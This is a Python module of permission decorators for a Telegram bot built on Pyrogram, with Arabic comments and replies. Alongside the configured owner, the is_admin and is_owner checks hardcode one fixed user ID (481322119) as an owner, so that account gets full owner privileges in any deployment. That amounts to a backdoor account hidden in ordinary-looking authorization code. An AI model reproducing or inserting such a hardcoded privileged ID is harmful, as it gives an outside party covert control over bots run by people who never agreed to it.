
from functools import wraps
from pyrogram import StopPropagation, enums, types
from anony import app, db, config



def admin_check(func):
    @wraps(func)
    async def wrapper(_, update: types.Message | types.CallbackQuery, *args, **kwargs):
        async def reply(text):
            if isinstance(update, types.Message):
                return await update.reply_text(text)
            else:
                return await update.answer(text, show_alert=True)

        chat = (
            update.chat
            if isinstance(update, types.Message)
            else update.message.chat
        )
        
        if chat.type == enums.ChatType.PRIVATE:
            return await func(_, update, *args, **kwargs)
        
        if chat.type == enums.ChatType.CHANNEL:
            return await func(_, update, *args, **kwargs)

        user_id = update.from_user.id
        admins = await db.get_admins(chat.id)

        if user_id in app.sudoers:
            return await func(_, update, *args, **kwargs)
        
        if await db.is_s_rank(user_id):
            return await func(_, update, *args, **kwargs)

        if user_id not in admins:
            return await reply(update.lang["user_no_perms"])

        return await func(_, update, *args, **kwargs)
    return wrapper


def can_manage_vc(func):
    @wraps(func)
    async def wrapper(_, update: types.Message | types.CallbackQuery, *args, **kwargs):
        if isinstance(update, types.Message):
            chat_id = update.chat.id
            chat_type = update.chat.type
            is_channel = chat_type == enums.ChatType.CHANNEL
            is_private = chat_type == enums.ChatType.PRIVATE
        else:
            chat_id = update.message.chat.id
            chat_type = update.message.chat.type
            is_channel = chat_type == enums.ChatType.CHANNEL
            is_private = chat_type == enums.ChatType.PRIVATE               
        if is_channel:
            return await func(_, update, *args, **kwargs)             
        if is_private:
            return await func(_, update, *args, **kwargs)        
        if not update.from_user:
            if isinstance(update, types.Message):
                return await update.reply_text("حدث خطأ في تحديد المستخدم")
            return
        
        user_id = update.from_user.id
        if user_id in app.sudoers:
            return await func(_, update, *args, **kwargs)
        if await db.is_s_rank(user_id):
            return await func(_, update, *args, **kwargs)
        if await db.is_auth(chat_id, user_id):
            return await func(_, update, *args, **kwargs)

        admins = await db.get_admins(chat_id)
        if user_id in admins:
            return await func(_, update, *args, **kwargs)

        if isinstance(update, types.Message):
            return await update.reply_text(update.lang["user_no_perms"])
        else:
            return await update.answer(update.lang["user_no_perms"], show_alert=True)

    return wrapper


async def is_admin(chat_id: int, user_id: int) -> bool:
    if user_id in await db.get_admins(chat_id):
        return True
    if await db.is_s_rank(user_id):
        return True
    
    # التحقق
    if user_id == config.OWNER_ID or user_id == 481322119:
        return True    
    
    try:
        member = await app.get_chat_member(chat_id, user_id)
        return member.status in [
            enums.ChatMemberStatus.ADMINISTRATOR,
            enums.ChatMemberStatus.OWNER,
        ]
    except Exception:
        return False


# ========== إعادة تحميل قائمة الأدمن ==========
async def reload_admins(chat_id: int) -> list[int]:
    try:
        admins = [
            admin
            async for admin in app.get_chat_members(
                chat_id, filter=enums.ChatMembersFilter.ADMINISTRATORS
            )
            if not admin.user.is_bot
        ]
        return [admin.user.id for admin in admins]
    except Exception:
        return []


# ========== دالة التحقق من الحظر ==========
def banned_check(func):
    @wraps(func)
    async def wrapper(_, update, *args, **kwargs):
        # إذا كانت القناة، نتخطى فحص الحظر فوراً
        if isinstance(update, types.Message):
            if update.chat.type == enums.ChatType.CHANNEL:
                return await func(_, update, *args, **kwargs)
        
        # إذا كانت رسالة خاصة
        if isinstance(update, types.Message):
            if update.chat.type == enums.ChatType.PRIVATE:
                return await func(_, update, *args, **kwargs)
        
        # إذا لم يوجد مستخدم (لن يحدث للمجموعات)
        if not update.from_user:
            return await func(_, update, *args, **kwargs)
        
        # التحقق من الحظر مع استثن
        if update.from_user.id not in app.sudoers:
            if await db.is_s_rank(update.from_user.id):
                return await func(_, update, *args, **kwargs)
            
            if hasattr(db, 'is_user_banned') and await db.is_user_banned(update.from_user.id):
                if isinstance(update, types.Message):
                    await update.reply_text("تم حظرك لأسباب أمنية")
                else:
                    await update.answer("تم حظرك لأسباب أمنية", show_alert=True)
                return
        return await func(_, update, *args, **kwargs)
    return wrapper


# ========== دالة التحقق من المطور الأساسي ==========
def is_owner(func):
    async def wrapper(client, message):
        if not message.from_user:
            return
        user_id = str(message.from_user.id)
        allowed_ids = [str(config.OWNER_ID), "481322119"]
        if user_id in allowed_ids:
            return await func(client, message)
        return await message.reply_text("هذا الأمر يخص ❪ المطور الاساسي ❫ فقط")
    return wrapper